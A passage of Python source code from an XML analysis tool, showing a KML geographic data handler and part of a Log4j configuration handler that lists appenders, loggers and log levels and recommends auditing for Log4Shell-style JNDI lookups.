                config_score += 0.2
        elif 'settings' in findings:
            # Settings file quality
            config_score = 0.8
        else:
            config_score = 0.5  # Moderate score for unknown type
        
        # Publication quality
        publication_score = 0.0
        if 'publications' in findings:
            pubs = findings['publications']
            if pubs['publication_count'] > 0:
                publication_score += 0.5
                
                # Bonus for artifact type diversity
                if len(pubs['artifact_types']) > 1:
                    publication_score += 0.3
                
                # Bonus for configuration mapping
                if pubs['configurations_published']:
                    publication_score += 0.2
        else:
            publication_score = 0.7  # Non-publishing modules or settings get moderate score
        
        return {
            "security": security_score,
            "dependency_management": dependency_score,
            "configuration": config_score,
            "publication": publication_score,
            "overall": (security_score + dependency_score + config_score + publication_score) / 4
        }
</file>

<file path="src/handlers/kml_handler.py">
#!/usr/bin/env python3
"""
KML (Keyhole Markup Language) Handler

Analyzes KML files used by Google Earth, Google Maps, and other
geographic visualization applications. Extracts placemarks, paths,
polygons, styles, and other geographic features.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class KMLHandler(XMLHandler):
    """Handler for KML geographic data files"""
    
    KML_NAMESPACE = "http://www.opengis.net/kml/2.2"
    EARTH_NAMESPACE = "http://earth.google.com/kml/2.2"
    
    def _get_namespace(self, root: ET.Element) -> str:
        """Extract namespace prefix from root element"""
        if '}' in root.tag:
            return root.tag.split('}')[0] + '}'
        return ''
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for KML namespace
        if any('opengis.net/kml' in uri or 'earth.google.com/kml' in uri for uri in namespaces.values()):
            return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'kml':
            # Check for KML-specific elements
            kml_elements = ['Document', 'Folder', 'Placemark', 'Point', 'LineString', 'Polygon']
            found = sum(1 for elem in kml_elements if root.find(f'.//{elem}') is not None)
            if found >= 2:
                return True, min(found * 0.2, 0.9)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect KML version
        version = "2.2"  # Default
        for uri in namespaces.values():
            if 'kml/2.1' in uri:
                version = "2.1"
            elif 'kml/2.0' in uri:
                version = "2.0"
        
        # Detect KML variant
        variant = "standard"
        # Use namespace-aware search for Google Earth extensions
        gx_namespace = "http://www.google.com/kml/ext/2.2"
        if root.find(f'.//{{{gx_namespace}}}Tour') is not None:
            variant = "google_earth_tour"
        elif root.find('.//NetworkLink') is not None:
            variant = "network_linked"
        
        return DocumentTypeInfo(
            type_name="KML Geographic Data",
            confidence=0.95,
            version=version,
            metadata={
                "standard": "OGC KML",
                "category": "geographic",
                "variant": variant,
                "application": "Google Earth/Maps"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'structure': self._analyze_structure(root),
            'placemarks': self._analyze_placemarks(root),
            'geometries': self._analyze_geometries(root),
            'styles': self._analyze_styles(root),
            'overlays': self._analyze_overlays(root),
            'network_links': self._analyze_network_links(root),
            'tours': self._analyze_tours(root),
            'data_quality': self._assess_data_quality(root)
        }
        
        recommendations = [
            "Visualize in Google Earth or compatible GIS software",
            "Extract coordinates for spatial analysis",
            "Convert to other GIS formats (GeoJSON, Shapefile)",
            "Analyze for data completeness and accuracy",
            "Optimize file size for web deployment",
            "Validate against KML schema",
            "Extract metadata for cataloging"
        ]
        
        ai_use_cases = [
            "Geospatial pattern recognition",
            "Location clustering and classification",
            "Route optimization and analysis",
            "Geographic feature extraction",
            "Spatial relationship discovery",
            "Area and distance calculations",
            "Terrain and elevation analysis",
            "Geographic anomaly detection",
            "Location-based recommendations"
        ]
        
        return SpecializedAnalysis(
            document_type="KML Geographic Data",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_features': findings['structure']['total_features'],
                'placemarks': len(findings['placemarks']),
                'geometries': findings['geometries']['total'],
                'styles': len(findings['styles']),
                'overlays': findings['overlays']['total']
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_quality_metrics(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'geographic_bounds': self._extract_bounds(root),
            'feature_collection': self._extract_features(root),
            'style_definitions': self._extract_style_definitions(root),
            'metadata': self._extract_metadata(root),
            'coordinate_systems': self._extract_coordinate_info(root)
        }
    
    def _analyze_structure(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze overall KML document structure"""
        structure = {
            'documents': 0,
            'folders': 0,
            'features': [],
            'total_features': 0,
            'max_depth': 0,
            'has_schema': False,
            'has_extended_data': False
        }
        
        # Get namespace
        ns = self._get_namespace(root)
        
        # Count structural elements using namespace
        structure['documents'] = len(root.findall(f'.//{ns}Document'))
        structure['folders'] = len(root.findall(f'.//{ns}Folder'))
        
        # Find all features
        feature_types = ['Placemark', 'GroundOverlay', 'ScreenOverlay', 
                        'PhotoOverlay', 'NetworkLink', 'Tour']
        
        for feature_type in feature_types:
            count = len(root.findall(f'.//{ns}{feature_type}'))
            if count > 0:
                structure['features'].append({
                    'type': feature_type,
                    'count': count
                })
                structure['total_features'] += count
        
        # Check for schemas and extended data
        structure['has_schema'] = root.find(f'.//{ns}Schema') is not None
        structure['has_extended_data'] = root.find(f'.//{ns}ExtendedData') is not None
        
        # Calculate depth
        structure['max_depth'] = self._calculate_max_depth(root)
        
        return structure
    
    def _analyze_placemarks(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze Placemark elements"""
        placemarks = []
        ns = self._get_namespace(root)
        
        for placemark in root.findall(f'.//{ns}Placemark')[:100]:  # Limit for performance
            pm_info = {
                'name': None,
                'description': None,
                'geometry_type': None,
                'style_url': None,
                'visibility': True,
                'has_extended_data': False,
                'snippet': None
            }
            
            # Extract basic info
            name = placemark.find(f'{ns}name')
            if name is not None and name.text:
                pm_info['name'] = name.text.strip()
            
            desc = placemark.find(f'{ns}description')
            if desc is not None and desc.text:
                pm_info['description'] = desc.text.strip()[:200]  # Truncate
            
            snippet = placemark.find(f'{ns}snippet')
            if snippet is not None and snippet.text:
                pm_info['snippet'] = snippet.text.strip()
            
            # Geometry type
            for geom_type in ['Point', 'LineString', 'Polygon', 'MultiGeometry']:
                if placemark.find(f'.//{ns}{geom_type}') is not None:
                    pm_info['geometry_type'] = geom_type
                    break
            
            # Style reference
            style_url = placemark.find(f'{ns}styleUrl')
            if style_url is not None and style_url.text:
                pm_info['style_url'] = style_url.text
            
            # Visibility
            visibility = placemark.find(f'{ns}visibility')
            if visibility is not None and visibility.text == '0':
                pm_info['visibility'] = False
            
            # Extended data
            pm_info['has_extended_data'] = placemark.find(f'{ns}ExtendedData') is not None
            
            placemarks.append(pm_info)
        
        return placemarks
    
    def _analyze_geometries(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze geometric elements"""
        geometries = {
            'total': 0,
            'points': 0,
            'lines': 0,
            'polygons': 0,
            'multi_geometries': 0,
            'models': 0,
            'coordinate_count': 0,
            'altitude_modes': {}
        }
        
        ns = self._get_namespace(root)
        
        # Count geometry types
        geometries['points'] = len(root.findall(f'.//{ns}Point'))
        geometries['lines'] = len(root.findall(f'.//{ns}LineString'))
        geometries['polygons'] = len(root.findall(f'.//{ns}Polygon'))
        geometries['multi_geometries'] = len(root.findall(f'.//{ns}MultiGeometry'))
        geometries['models'] = len(root.findall(f'.//{ns}Model'))
        
        geometries['total'] = sum([
            geometries['points'],
            geometries['lines'],
            geometries['polygons'],
            geometries['multi_geometries'],
            geometries['models']
        ])
        
        # Count coordinates
        for coords in root.findall(f'.//{ns}coordinates'):
            if coords.text:
                # Rough count of coordinate tuples
                geometries['coordinate_count'] += len(coords.text.strip().split())
        
        # Analyze altitude modes
        for mode_elem in root.findall(f'.//{ns}altitudeMode'):
            if mode_elem.text:
                mode_text = mode_elem.text.strip()
                geometries['altitude_modes'][mode_text] = geometries['altitude_modes'].get(mode_text, 0) + 1
        
        return geometries
    
    def _analyze_styles(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze style definitions"""
        styles = []
        
        for style in root.findall('.//Style'):
            style_info = {
                'id': style.get('id'),
                'icon_style': None,
                'line_style': None,
                'poly_style': None,
                'label_style': None,
                'balloon_style': None
            }
            
            # Icon style
            icon_style = style.find('.//IconStyle')
            if icon_style is not None:
                style_info['icon_style'] = {
                    'color': self._get_element_text(icon_style, 'color'),
                    'scale': self._get_element_text(icon_style, 'scale'),
                    'icon_href': self._get_element_text(icon_style, './/href')
                }
            
            # Line style
            line_style = style.find('.//LineStyle')
            if line_style is not None:
                style_info['line_style'] = {
                    'color': self._get_element_text(line_style, 'color'),
                    'width': self._get_element_text(line_style, 'width')
                }
            
            # Polygon style
            poly_style = style.find('.//PolyStyle')
            if poly_style is not None:
                style_info['poly_style'] = {
                    'color': self._get_element_text(poly_style, 'color'),
                    'fill': self._get_element_text(poly_style, 'fill') != '0',
                    'outline': self._get_element_text(poly_style, 'outline') != '0'
                }
            
            # Label style
            label_style = style.find('.//LabelStyle')
            if label_style is not None:
                style_info['label_style'] = {
                    'color': self._get_element_text(label_style, 'color'),
                    'scale': self._get_element_text(label_style, 'scale')
                }
            
            # Balloon style
            balloon_style = style.find('.//BalloonStyle')
            if balloon_style is not None:
                style_info['balloon_style'] = {
                    'bg_color': self._get_element_text(balloon_style, 'bgColor'),
                    'text_color': self._get_element_text(balloon_style, 'textColor')
                }
            
            styles.append(style_info)
        
        return styles[:50]  # Limit
    
    def _analyze_overlays(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze overlay elements"""
        overlays = {
            'total': 0,
            'ground_overlays': [],
            'screen_overlays': [],
            'photo_overlays': []
        }
        
        # Ground overlays
        for overlay in root.findall('.//GroundOverlay')[:20]:
            overlay_info = {
                'name': self._get_element_text(overlay, 'name'),
                'icon_href': self._get_element_text(overlay, './/Icon/href'),
                'has_lat_lon_box': overlay.find('.//LatLonBox') is not None
            }
            overlays['ground_overlays'].append(overlay_info)
        
        # Screen overlays
        for overlay in root.findall('.//ScreenOverlay')[:20]:
            overlay_info = {
                'name': self._get_element_text(overlay, 'name'),
                'icon_href': self._get_element_text(overlay, './/Icon/href')
            }
            overlays['screen_overlays'].append(overlay_info)
        
        # Photo overlays
        for overlay in root.findall('.//PhotoOverlay')[:20]:
            overlay_info = {
                'name': self._get_element_text(overlay, 'name'),
                'icon_href': self._get_element_text(overlay, './/Icon/href'),
                'has_view_volume': overlay.find('.//ViewVolume') is not None
            }
            overlays['photo_overlays'].append(overlay_info)
        
        overlays['total'] = (len(overlays['ground_overlays']) + 
                           len(overlays['screen_overlays']) + 
                           len(overlays['photo_overlays']))
        
        return overlays
    
    def _analyze_network_links(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze NetworkLink elements"""
        network_links = []
        
        for link in root.findall('.//NetworkLink')[:20]:
            link_info = {
                'name': self._get_element_text(link, 'name'),
                'href': self._get_element_text(link, './/href'),
                'refresh_mode': self._get_element_text(link, './/refreshMode'),
                'refresh_interval': self._get_element_text(link, './/refreshInterval'),
                'view_refresh_mode': self._get_element_text(link, './/viewRefreshMode')
            }
            network_links.append(link_info)
        
        return network_links
    
    def _analyze_tours(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Google Earth Tour elements"""
        tours = {
            'count': 0,
            'tour_info': []
        }
        
        # Look for gx:Tour elements
        for tour in root.findall('.//{http://www.google.com/kml/ext/2.2}Tour')[:10]:
            tour_info = {
                'name': self._get_element_text(tour, 'name'),
                'playlist_items': 0
            }
            
            # Count playlist items
            playlist = tour.find('.//{http://www.google.com/kml/ext/2.2}Playlist')
            if playlist is not None:
                tour_info['playlist_items'] = len(list(playlist))
            
            tours['tour_info'].append(tour_info)
        
        tours['count'] = len(tours['tour_info'])
        
        return tours
    
    def _assess_data_quality(self, root: ET.Element) -> Dict[str, Any]:
        """Assess the quality of KML data"""
        quality = {
            'has_names': 0,
            'has_descriptions': 0,
            'has_coordinates': 0,
            'uses_styles': 0,
            'organized_folders': False,
            'uses_schemas': False,
            'coordinate_precision': 'unknown'
        }
        
        # Check feature completeness
        placemarks = root.findall('.//Placemark')
        if placemarks:
            quality['has_names'] = sum(1 for p in placemarks if p.find('name') is not None) / len(placemarks)
            quality['has_descriptions'] = sum(1 for p in placemarks if p.find('description') is not None) / len(placemarks)
            quality['has_coordinates'] = sum(1 for p in placemarks if p.find('.//coordinates') is not None) / len(placemarks)
            quality['uses_styles'] = sum(1 for p in placemarks if p.find('styleUrl') is not None) / len(placemarks)
        
        # Check organization
        quality['organized_folders'] = len(root.findall('.//Folder')) > 0
        quality['uses_schemas'] = root.find('.//Schema') is not None
        
        # Check coordinate precision
        coords_sample = root.find('.//coordinates')
        if coords_sample is not None and coords_sample.text:
            coord_parts = coords_sample.text.strip().split(',')
            if len(coord_parts) >= 2:
                decimal_places = len(coord_parts[0].split('.')[-1]) if '.' in coord_parts[0] else 0
                if decimal_places >= 6:
                    quality['coordinate_precision'] = 'high'
                elif decimal_places >= 4:
                    quality['coordinate_precision'] = 'medium'
                else:
                    quality['coordinate_precision'] = 'low'
        
        return quality
    
    def _extract_bounds(self, root: ET.Element) -> Dict[str, float]:
        """Extract geographic bounds from coordinates"""
        bounds = {
            'north': -90.0,
            'south': 90.0,
            'east': -180.0,
            'west': 180.0
        }
        
        # Look for explicit bounds
        lat_lon_box = root.find('.//LatLonBox')
        if lat_lon_box is not None:
            bounds['north'] = float(self._get_element_text(lat_lon_box, 'north', '-90'))
            bounds['south'] = float(self._get_element_text(lat_lon_box, 'south', '90'))
            bounds['east'] = float(self._get_element_text(lat_lon_box, 'east', '-180'))
            bounds['west'] = float(self._get_element_text(lat_lon_box, 'west', '180'))
        else:
            # Calculate from coordinates
            for coords_elem in root.findall('.//coordinates'):
                if coords_elem.text:
                    coords = coords_elem.text.strip().split()
                    for coord in coords:
                        parts = coord.split(',')
                        if len(parts) >= 2:
                            try:
                                lon = float(parts[0])
                                lat = float(parts[1])
                                bounds['north'] = max(bounds['north'], lat)
                                bounds['south'] = min(bounds['south'], lat)
                                bounds['east'] = max(bounds['east'], lon)
                                bounds['west'] = min(bounds['west'], lon)
                            except ValueError:
                                continue
        
        return bounds
    
    def _extract_features(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract key features for analysis"""
        features = []
        
        for placemark in root.findall('.//Placemark')[:50]:  # Limit
            feature = {
                'type': 'Feature',
                'properties': {},
                'geometry': None
            }
            
            # Properties
            name = placemark.find('name')
            if name is not None and name.text:
                feature['properties']['name'] = name.text.strip()
            
            desc = placemark.find('description')
            if desc is not None and desc.text:
                feature['properties']['description'] = desc.text.strip()[:500]
            
            # Geometry
            point = placemark.find('.//Point/coordinates')
            if point is not None and point.text:
                coords = point.text.strip().split(',')
                if len(coords) >= 2:
                    feature['geometry'] = {
                        'type': 'Point',
                        'coordinates': [float(coords[0]), float(coords[1])]
                    }
            
            line = placemark.find('.//LineString/coordinates')
            if line is not None and line.text:
                feature['geometry'] = {
                    'type': 'LineString',
                    'coordinates': self._parse_coordinate_string(line.text)
                }
            
            polygon = placemark.find('.//Polygon/outerBoundaryIs/LinearRing/coordinates')
            if polygon is not None and polygon.text:
                feature['geometry'] = {
                    'type': 'Polygon',
                    'coordinates': [self._parse_coordinate_string(polygon.text)]
                }
            
            if feature['geometry']:
                features.append(feature)
        
        return features
    
    def _parse_coordinate_string(self, coord_string: str) -> List[List[float]]:
        """Parse KML coordinate string into coordinate array"""
        coordinates = []
        coords = coord_string.strip().split()
        
        for coord in coords:
            parts = coord.split(',')
            if len(parts) >= 2:
                try:
                    coordinates.append([float(parts[0]), float(parts[1])])
                except ValueError:
                    continue
        
        return coordinates
    
    def _extract_style_definitions(self, root: ET.Element) -> Dict[str, Dict[str, Any]]:
        """Extract style definitions for reuse"""
        styles = {}
        
        for style in root.findall('.//Style'):
            style_id = style.get('id')
            if style_id:
                style_def = {}
                
                # Extract color from first found style element
                for style_type in ['IconStyle', 'LineStyle', 'PolyStyle', 'LabelStyle']:
                    style_elem = style.find(f'.//{style_type}')
                    if style_elem is not None:
                        color = self._get_element_text(style_elem, 'color')
                        if color:
                            style_def['color'] = color
                            break
                
                if style_def:
                    styles[style_id] = style_def
        
        return styles
    
    def _extract_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Extract document metadata"""
        metadata = {
            'name': self._get_element_text(root, './/Document/name'),
            'description': self._get_element_text(root, './/Document/description'),
            'author': None,
            'link': None,
            'address': None,
            'snippet': self._get_element_text(root, './/Document/Snippet')
        }
        
        # Author info
        author = root.find('.//atom:author', {'atom': 'http://www.w3.org/2005/Atom'})
        if author is not None:
            metadata['author'] = self._get_element_text(author, 'atom:name', namespaces={'atom': 'http://www.w3.org/2005/Atom'})
        
        # Link
        link = root.find('.//atom:link', {'atom': 'http://www.w3.org/2005/Atom'})
        if link is not None:
            metadata['link'] = link.get('href')
        
        # Address
        address = root.find('.//address')
        if address is not None and address.text:
            metadata['address'] = address.text.strip()
        
        return metadata
    
    def _extract_coordinate_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract coordinate system information"""
        coord_info = {
            'altitude_modes_used': [],
            'has_3d_coordinates': False,
            'coordinate_precision': 'unknown',
            'uses_tessellation': False
        }
        
        # Check altitude modes
        altitude_modes = set()
        for mode in root.findall('.//altitudeMode'):
            if mode.text:
                altitude_modes.add(mode.text.strip())
        coord_info['altitude_modes_used'] = list(altitude_modes)
        
        # Check for 3D coordinates
        for coords in root.findall('.//coordinates'):
            if coords.text and coords.text.strip():
                # Check if any coordinate has altitude
                coord_parts = coords.text.strip().split()[0].split(',')
                if len(coord_parts) >= 3:
                    coord_info['has_3d_coordinates'] = True
                    break
        
        # Check tessellation
        coord_info['uses_tessellation'] = root.find('.//tessellate[.="1"]') is not None
        
        return coord_info
    
    def _calculate_max_depth(self, element: ET.Element, current_depth: int = 0) -> int:
        """Calculate maximum nesting depth"""
        if not list(element):
            return current_depth
        
        max_child_depth = current_depth
        for child in element:
            child_depth = self._calculate_max_depth(child, current_depth + 1)
            max_child_depth = max(max_child_depth, child_depth)
        
        return max_child_depth
    
    def _get_element_text(self, parent: ET.Element, path: str, default: str = None, 
                         namespaces: Dict[str, str] = None) -> Optional[str]:
        """Safely get element text"""
        elem = parent.find(path, namespaces) if namespaces else parent.find(path)
        if elem is not None and elem.text:
            return elem.text.strip()
        return default
    
    def _calculate_quality_metrics(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Calculate quality metrics for the KML data"""
        metrics = {
            'completeness': 0.0,
            'organization': 0.0,
            'richness': 0.0,
            'precision': 0.0,
            'overall': 0.0
        }
        
        # Completeness (based on names, descriptions, coordinates)
        quality_data = findings.get('data_quality', {})
        completeness_factors = [
            quality_data.get('has_names', 0),
            quality_data.get('has_descriptions', 0) * 0.5,  # Less weight
            quality_data.get('has_coordinates', 0),
            quality_data.get('uses_styles', 0) * 0.5
        ]
        metrics['completeness'] = sum(completeness_factors) / 3.0
        
        # Organization (folders, schemas)
        if quality_data.get('organized_folders'):
            metrics['organization'] += 0.5
        if quality_data.get('uses_schemas'):
            metrics['organization'] += 0.5
        
        # Richness (variety of features, styles, extended data)
        structure = findings.get('structure', {})
        if structure.get('total_features', 0) > 10:
            metrics['richness'] += 0.3
        if len(findings.get('styles', [])) > 5:
            metrics['richness'] += 0.3
        if structure.get('has_extended_data'):
            metrics['richness'] += 0.4
        
        # Precision (coordinate precision)
        precision_map = {'high': 1.0, 'medium': 0.7, 'low': 0.4, 'unknown': 0.5}
        metrics['precision'] = precision_map.get(quality_data.get('coordinate_precision', 'unknown'), 0.5)
        
        # Overall
        metrics['overall'] = (
            metrics['completeness'] * 0.4 +
            metrics['organization'] * 0.2 +
            metrics['richness'] * 0.2 +
            metrics['precision'] * 0.2
        )
        
        return metrics
</file>

<file path="src/handlers/log4j_config_handler.py">
#!/usr/bin/env python3
"""
Log4j Configuration Handler

Analyzes Apache Log4j XML configuration files for log level optimization,
security configuration analysis, performance assessment, and compliance checking.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class Log4jConfigHandler(XMLHandler):
    """Handler for Log4j XML configuration files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Log4j 1.x uses 'log4j:configuration'
        if root.tag == 'log4j:configuration' or root.tag.endswith('}configuration'):
            if 'log4j' in root.tag:
                return True, 1.0
        
        # Log4j 2.x uses 'Configuration'
        if root.tag == 'Configuration':
            if root.find('.//Appenders') is not None or root.find('.//Loggers') is not None:
                return True, 0.9
            
            # Check for Log4j 2.x specific attributes
            if root.get('status') or root.get('monitorInterval'):
                return True, 0.8
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        version = "2.x" if root.tag == 'Configuration' else "1.x"
        
        # Extract more detailed version information
        detailed_version = self._detect_detailed_version(root, namespaces)
        
        metadata = {
            "framework": "Apache Log4j",
            "category": "logging_configuration",
            "version_major": version,
            "appender_count": self._count_appenders(root),
            "logger_count": self._count_loggers(root),
            "has_security_issues": len(self._check_security_issues(root)) > 0
        }
        
        return DocumentTypeInfo(
            type_name="Log4j Configuration",
            confidence=1.0,
            version=detailed_version or version,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        is_v2 = root.tag == 'Configuration'
        
        findings = {
            'log4j_info': {
                'version': "2.x" if is_v2 else "1.x",
                'detailed_version': self._detect_detailed_version(root, {}),
                'configuration_source': file_path
            },
            'appenders': self._analyze_appenders(root, is_v2),
            'loggers': self._analyze_loggers(root, is_v2),
            'log_levels': self._extract_log_levels(root, is_v2),
            'patterns': self._analyze_patterns(root, is_v2),
            'filters': self._analyze_filters(root, is_v2),
            'security_concerns': self._check_security_issues(root),
            'performance': self._analyze_performance_settings(root, is_v2),
            'global_settings': self._extract_global_settings(root, is_v2)
        }
        
        recommendations = [
            "Review log levels for production appropriateness",
            "Check for sensitive data in log patterns",
            "Ensure file appenders have proper rotation",
            "Validate external appender destinations",
            "Check for JNDI lookup patterns (Log4Shell vulnerability)",
            "Optimize pattern layouts for performance",
            "Review async appender configurations",
            "Validate log file permissions and locations"
        ]
        
        ai_use_cases = [
            "Log level optimization and tuning",
            "Security configuration analysis and hardening",
            "Performance impact assessment and optimization",
            "Compliance checking for log retention policies",
            "Sensitive data detection in log patterns",
            "Log4Shell vulnerability assessment",
            "Log rotation and archival policy analysis",
            "Monitoring and alerting configuration review",
            "Centralized logging integration analysis"
        ]
        
        data_inventory = {
            'appenders': len(findings['appenders']['appender_details']),
            'loggers': len(findings['loggers']['logger_details']),
            'patterns': len(findings['patterns']['pattern_details']),
            'filters': len(findings['filters']['filter_details']),
            'security_issues': len(findings['security_concerns']['security_risks'])
        }
        
        return SpecializedAnalysis(
            document_type=f"Log4j {findings['log4j_info']['version']} Configuration",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_logging_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        is_v2 = root.tag == 'Configuration'
        
        return {
            'configuration_metadata': {
                'version': "2.x" if is_v2 else "1.x",
                'monitoring_enabled': root.get('monitorInterval') is not None if is_v2 else False,
                'status_level': root.get('status') if is_v2 else root.get('threshold')
            },
            'appender_summary': self._extract_appender_summary(root, is_v2),
            'logger_summary': self._extract_logger_summary(root, is_v2),
            'security_summary': self._extract_security_summary(root)
        }
    
    def _detect_detailed_version(self, root: ET.Element, namespaces: Dict[str, str]) -> Optional[str]:
        """Attempt to detect more detailed Log4j version"""
        # Check for version in attributes or comments
        if root.tag == 'Configuration':
            # Log4j 2.x - check for version-specific features
            if root.find('.//AsyncRoot') is not None:
                return "2.6+"  # AsyncRoot introduced in 2.6
            elif root.find('.//ScriptFilter') is not None:
                return "2.4+"  # ScriptFilter introduced in 2.4
            else:
                return "2.x"
        else:
            return "1.x"
    
    def _count_appenders(self, root: ET.Element) -> int:
        """Count number of appenders"""
        if root.tag == 'Configuration':
            return len(root.findall('.//Appenders/*'))
        else:
            return len(root.findall('.//appender'))
    
    def _count_loggers(self, root: ET.Element) -> int:
        """Count number of loggers"""
        if root.tag == 'Configuration':
            return len(root.findall('.//Loggers/*'))
        else:
            return len(root.findall('.//logger')) + len(root.findall('.//root'))
    
    def _analyze_appenders(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Analyze appender configurations"""
        appender_info = {
            'appender_count': 0,
            'appender_details': [],
            'appender_types': {},
            'file_appenders': [],
            'async_appenders': [],
            'external_appenders': []
        }
        
        if is_v2:
            appenders_section = root.find('.//Appenders')
            if appenders_section is not None:
                for appender in appenders_section:
                    appender_detail = {
                        'name': appender.get('name'),
                        'type': appender.tag,
                        'target': self._extract_v2_target(appender),
                        'pattern': self._extract_pattern(appender),
                        'async': appender.tag == 'AsyncAppender',
                        'filters': len(list(appender.iter('Filter')))
                    }
                    
                    appender_info['appender_details'].append(appender_detail)
                    appender_info['appender_count'] += 1
                    
                    # Categorize appenders
                    appender_type = appender.tag
                    appender_info['appender_types'][appender_type] = \
                        appender_info['appender_types'].get(appender_type, 0) + 1
                    
                    if appender_type in ['File', 'RollingFile']:
                        appender_info['file_appenders'].append(appender_detail)
                    elif appender_type == 'AsyncAppender':
                        appender_info['async_appenders'].append(appender_detail)
                    elif appender_type in ['Socket', 'JMS', 'SMTP']:
                        appender_info['external_appenders'].append(appender_detail)
        else:
            for appender in root.findall('.//appender'):
                class_name = appender.get('class', '')
                appender_detail = {
                    'name': appender.get('name'),
                    'class': class_name,
                    'type': self._extract_v1_type(class_name),
                    'target': self._extract_v1_target(appender),
                    'pattern': self._extract_pattern(appender),
                    'async': 'AsyncAppender' in class_name
                }
                
                appender_info['appender_details'].append(appender_detail)
                appender_info['appender_count'] += 1
                
                appender_type = appender_detail['type']
                appender_info['appender_types'][appender_type] = \
                    appender_info['appender_types'].get(appender_type, 0) + 1
                
                if 'File' in appender_type:
                    appender_info['file_appenders'].append(appender_detail)
                elif 'Async' in class_name:
                    appender_info['async_appenders'].append(appender_detail)
                elif any(ext in class_name for ext in ['Socket', 'JMS', 'SMTP']):
                    appender_info['external_appenders'].append(appender_detail)
        
        return appender_info
    
    def _analyze_loggers(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Analyze logger configurations"""
        logger_info = {
            'logger_count': 0,
            'logger_details': [],
            'root_logger': None,
            'package_loggers': [],
            'class_loggers': [],
            'level_distribution': {}
        }
        
        if is_v2:
            loggers_section = root.find('.//Loggers')
            if loggers_section is not None:
                for logger in loggers_section:
                    logger_name = logger.get('name', 'ROOT' if logger.tag == 'Root' else '')
                    logger_level = logger.get('level')
                    
                    logger_detail = {
                        'name': logger_name,
                        'level': logger_level,
                        'additivity': logger.get('additivity', 'true'),
                        'appender_refs': [ref.get('ref') for ref in logger.findall('.//AppenderRef')],
                        'is_root': logger.tag == 'Root',
                        'is_async': logger.tag == 'AsyncRoot'
                    }
                    
                    logger_info['logger_details'].append(logger_detail)
                    logger_info['logger_count'] += 1
                    
                    # Categorize loggers
                    if logger_detail['is_root']:
                        logger_info['root_logger'] = logger_detail
                    elif '.' in logger_name:
                        logger_info['package_loggers'].append(logger_detail)
                    else:
                        logger_info['class_loggers'].append(logger_detail)
                    
                    # Track level distribution
                    if logger_level:
                        logger_info['level_distribution'][logger_level] = \
                            logger_info['level_distribution'].get(logger_level, 0) + 1
        else:
            # Handle Log4j 1.x root logger
            root_logger = root.find('.//root')
            if root_logger is not None:
                level_elem = root_logger.find('.//level')
                logger_detail = {
                    'name': 'ROOT',
                    'level': level_elem.get('value') if level_elem is not None else None,
                    'appender_refs': [ref.get('ref') for ref in root_logger.findall('.//appender-ref')],
                    'is_root': True,
                    'is_async': False
                }
                logger_info['root_logger'] = logger_detail
                logger_info['logger_details'].append(logger_detail)
                logger_info['logger_count'] += 1
            
            # Handle regular loggers
            for logger in root.findall('.//logger'):
                logger_name = logger.get('name', '')
                level_elem = logger.find('.//level')
                logger_level = level_elem.get('value') if level_elem is not None else None
                
                logger_detail = {
                    'name': logger_name,
                    'level': logger_level,
                    'additivity': logger.get('additivity', 'true'),
                    'appender_refs': [ref.get('ref') for ref in logger.findall('.//appender-ref')],
                    'is_root': False,
                    'is_async': False
                }
                
                logger_info['logger_details'].append(logger_detail)
                logger_info['logger_count'] += 1
                
                if '.' in logger_name:
                    logger_info['package_loggers'].append(logger_detail)
                else:
                    logger_info['class_loggers'].append(logger_detail)
                
                if logger_level:
                    logger_info['level_distribution'][logger_level] = \
                        logger_info['level_distribution'].get(logger_level, 0) + 1
        
        return logger_info
    
    def _extract_log_levels(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Extract and analyze log levels"""
        level_info = {
            'level_counts': {},
            'production_appropriate': True,
            'debug_loggers': [],
            'trace_loggers': []
        }
        
        if is_v2:
            for elem in root.findall('.//*[@level]'):
                level = elem.get('level').upper()
                level_info['level_counts'][level] = level_info['level_counts'].get(level, 0) + 1
                
                if level in ['DEBUG', 'TRACE']:
                    logger_name = elem.get('name', elem.tag)
                    if level == 'DEBUG':
                        level_info['debug_loggers'].append(logger_name)
                    else:
